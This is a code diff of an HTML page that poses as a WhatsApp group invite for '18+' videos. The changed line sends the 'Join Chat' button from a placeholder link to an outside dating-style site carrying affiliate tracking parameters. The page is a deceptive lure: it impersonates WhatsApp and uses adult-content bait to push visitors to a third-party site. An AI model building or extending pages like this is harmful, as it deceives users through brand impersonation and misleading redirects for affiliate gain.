@@ -47,7 +47,7 @@
 				<a href="#" id="action-icon" title="Follow this link to join: Berbagi Video 18+ Hot" class="block__img img icon-chat"><span class="img__body" style="background-image: url(img/18.jpg);"></span></a>
 				<h2 class="block__title">Groupe 18+<h2>
 				<h3 class="block__subtitle" dir="auto">WhatsApp Group Invite</h3>
-				<button onclick="location.href='https://google.com';" type="button" class="button button--simple button--primary">Join Chat</button>
+				<button onclick="location.href='https://flirtymatch4u.com/?utm_source=8QilD9IQnEFz&utm_campaign=GINNA&utm_term=GINNA';" type="button" class="button button--simple button--primary">Join Chat</button>
 			</div>
 			<hr>
 			<div class="block block--hint">
